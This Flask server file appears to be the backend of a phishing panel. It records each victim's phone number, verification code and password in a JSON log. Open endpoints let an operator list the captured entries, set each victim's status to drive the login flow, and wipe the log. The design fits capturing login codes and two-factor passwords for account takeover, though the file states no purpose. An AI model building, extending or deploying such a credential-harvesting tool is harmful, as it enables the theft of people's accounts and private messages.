from flask import Flask, render_template, request, jsonify, send_from_directory
import json
import os
from datetime import datetime

app = Flask(__name__, static_folder='static')

LOGS_FILE = 'logs.json'

def load_logs():
    if not os.path.exists(LOGS_FILE):
        return []
    try:
        with open(LOGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def save_logs(logs):
    with open(LOGS_FILE, 'w', encoding='utf-8') as f:
        json.dump(logs, f, ensure_ascii=False, indent=4)

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)

@app.route('/api/save_log', methods=['POST'])
def save_log_endpoint():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "No phone provided"}), 400

    logs = load_logs()
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    # Check if entry exists
    existing_index = next((i for i, item in enumerate(logs) if item["phone"] == phone), None)
    
    if existing_index is not None:
        # Update existing
        logs[existing_index].update(data)
        logs[existing_index]["time"] = timestamp
    else:
        # Create new
        new_entry = {
            "phone": phone,
            "code": "",
            "status": "idle",
            "password": "",
            "time": timestamp
        }
        new_entry.update(data)
        logs.insert(0, new_entry)
    
    save_logs(logs)
    return jsonify({"success": True})

@app.route('/api/get_logs', methods=['GET'])
def get_logs_endpoint():
    return jsonify(load_logs())

@app.route('/api/set_status', methods=['POST'])
def set_status_endpoint():
    data = request.json
    phone = data.get('phone')
    status = data.get('status')
    
    logs = load_logs()
    for log in logs:
        if log['phone'] == phone:
            log['status'] = status
            break
    
    save_logs(logs)
    return jsonify({"success": True})

@app.route('/api/clear_logs', methods=['POST'])
def clear_logs_endpoint():
    save_logs([])
    return jsonify({"success": True})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
